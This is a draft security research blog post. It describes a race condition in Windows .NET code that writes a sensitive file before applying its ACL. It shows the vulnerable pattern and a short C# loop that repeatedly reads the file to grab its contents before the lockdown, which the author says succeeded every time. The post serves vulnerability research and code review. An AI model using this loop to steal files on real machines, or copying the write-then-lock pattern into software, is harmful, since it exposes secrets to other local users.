---
title: "Applying ACLs and Race Conditions"
date: 2020-02-15T12:23:33-08:00
draft: true
tags: [
        "pentesting",
        "research"
    ]
---

Sometimes there are intersting race conditions that allowe an adversary to gain access to sensitive files on a machine. The system would create files that contain sensitive information and afterwards apply permissions to lock the file down.

## Understanding the race condition

Let's look at a practical example seen in the wild a few times. Imagine the following code:

* Code creates file with sensitive information. Doing something like:

```
file.WriteAllBytes(filePath, content);
```
* Then the ACL is updated to lock down the file. [Here is a the documentation on how to do that using the FileSecurity class](https://docs.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.filesecurity?view=netframework-4.8)).Hence, you might see something similar to:

```
// Add the access control entry to the file.
AddFileSecurity(filePath, @"Administrators",
    FileSystemRights.ReadData, AccessControlType.Allow);
```

Aditionally, permission inheritance will be broken by the developer as well (e.g to prevent automatic read access, as otherwise the file likely won't be locked down properly anyways).

*These two instructions above are basically rigth after each other.*

## Exploitable?
So, what's the chance of an adversary on the machine reading the file right after it was created, but before the permission lockdown happens. My initial thought was that this could theoretically be exploitable by someone else on the machine, but probably is too narrow of a window for a stable exploit. 

Nevertheless, I thought to give it a try and build a little File Stealer.

## Winning the race 
Nothing fancy when it comes to testing for this. I built a simple tool in C# that tries to access the file in a loop and prints out the contents if that is the case. 
This is basically the core part of the utility:

``` 
while (true)
{
    try
    {
        string content = File.ReadAllText(path);

        Console.WriteLine("*** SUCCESS: File was grabbed before the ACL got applied! ***");
        Console.WriteLine(content);
        break;
    }
    catch (Exception ex)
    {
        //Console.Write("."); //provide feedback of access denied/file not found
    }
}

Console.WriteLine("*** Done");
```

For this example the filename needs to be known, which in the scenario I looked at was actually predictable.


## What's the result you might ask?

*Turns out that this worked 100% of the time so far.*

There are sometimes similar coding patterns I have seen with registry key, so I am adding this to my static anlaysis TODO list for things to check for.

Hope that helps - also if you find something similar, reach out. Curious to see how common that is.


## References

* [FileSecurity Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.filesecurity?view=netframework-4.8)



